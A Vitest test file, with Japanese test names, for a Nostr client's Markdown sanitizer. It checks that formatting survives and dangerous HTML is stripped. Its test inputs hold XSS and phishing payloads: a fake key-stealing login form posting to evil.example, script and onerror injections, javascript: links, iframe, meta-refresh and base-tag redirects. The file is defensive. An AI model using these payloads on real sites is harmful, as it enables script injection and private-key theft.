// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { renderInlineMarkdown, parseMarkdownContent } from './markdown';

// サニタイズ結果を DOM として調べる
function dom(html: string): HTMLElement {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
}

describe('renderInlineMarkdown：Markdown の表示', () => {
  it('強調・リンク・リスト・改行はそのまま出る', () => {
    const el = dom(
      renderInlineMarkdown('**太字** と *斜体* と [リンク](https://example.com)\n次の行\n\n- 項目')
    );
    expect(el.querySelector('strong')?.textContent).toBe('太字');
    expect(el.querySelector('em')?.textContent).toBe('斜体');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://example.com');
    expect(el.querySelector('br')).not.toBeNull();
    expect(el.querySelector('ul > li')?.textContent).toBe('項目');
  });

  it('画像・表・引用・コードも出る', () => {
    const el = dom(
      renderInlineMarkdown(
        '![代替](https://example.com/a.png)\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n> 引用\n\n`code`'
      )
    );
    expect(el.querySelector('img')?.getAttribute('src')).toBe('https://example.com/a.png');
    expect(el.querySelector('img')?.getAttribute('alt')).toBe('代替');
    expect(el.querySelectorAll('td')).toHaveLength(2);
    expect(el.querySelector('blockquote')?.textContent).toContain('引用');
    expect(el.querySelector('code')?.textContent).toBe('code');
  });

  it('タスクリストのチェックボックスは操作できない形で残る', () => {
    const el = dom(renderInlineMarkdown('- [x] 済み\n- [ ] 未'));
    const boxes = el.querySelectorAll('input');
    expect(boxes).toHaveLength(2);
    for (const box of boxes) {
      expect(box.getAttribute('type')).toBe('checkbox');
      expect(box.hasAttribute('disabled')).toBe(true);
    }
  });
});

describe('renderInlineMarkdown：本文に書かれた HTML', () => {
  it('フォームと入力欄は出ない（偽のログイン画面を作れない）', () => {
    const el = dom(
      renderInlineMarkdown(
        '<form action="https://evil.example/steal"><input name="nsec" placeholder="nsec1…"><button>ログイン</button><textarea></textarea><select><option>1</option></select></form>'
      )
    );
    expect(el.querySelector('form, input, button, textarea, select, option')).toBeNull();
  });

  it('チェックボックス以外の <input> は出ない', () => {
    const el = dom(renderInlineMarkdown('<input type="text"><input type="password"><input>'));
    expect(el.querySelector('input')).toBeNull();
  });

  it('style・class・id・name 属性は外れる（画面を覆う表示やアプリの見た目のなりすましを防ぐ）', () => {
    const el = dom(
      renderInlineMarkdown(
        '<div id="pwn" class="btn-publish" style="position:fixed;inset:0;z-index:99999" name="x">本文</div>'
      )
    );
    const div = el.querySelector('div');
    expect(div?.textContent).toBe('本文');
    expect(div?.attributes).toHaveLength(0);
  });

  it('スクリプト・イベントハンドラ・javascript: のリンクは外れる', () => {
    const el = dom(
      renderInlineMarkdown(
        '<script>alert(1)</script><img src="https://example.com/a.png" onerror="alert(1)"><a href="javascript:alert(1)">リンク</a>'
      )
    );
    expect(el.querySelector('script')).toBeNull();
    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false);
    expect(el.querySelector('a')?.hasAttribute('href')).toBe(false);
  });

  it('<style>・<iframe>・<svg>・<meta>・<base> は出ない', () => {
    const el = dom(
      renderInlineMarkdown(
        '<style>body{display:none}</style><iframe src="https://evil.example"></iframe><svg><a xlink:href="https://evil.example"><text>x</text></a></svg><meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">'
      )
    );
    expect(el.querySelector('style, iframe, svg, meta, base')).toBeNull();
  });

  it('通さないタグの中の文章は残る', () => {
    const el = dom(renderInlineMarkdown('<center>中央の文章</center>'));
    expect(el.textContent).toContain('中央の文章');
  });
});

describe('parseMarkdownContent', () => {
  it('nostr: の参照で区切り、文章の部分は同じ規則でサニタイズする', () => {
    const nevent = 'nevent1' + 'q'.repeat(20);
    const segments = parseMarkdownContent(
      `前の文章<form><input name="a"></form>\n\nnostr:${nevent}\n\n後ろの文章`
    );
    expect(segments.map((s) => s.type)).toEqual(['html', 'nevent', 'html']);
    const first = segments[0];
    expect(first.type === 'html' && dom(first.html).querySelector('form, input')).toBeNull();
    expect(segments[1]).toEqual({ type: 'nevent', ref: `nostr:${nevent}` });
  });
});
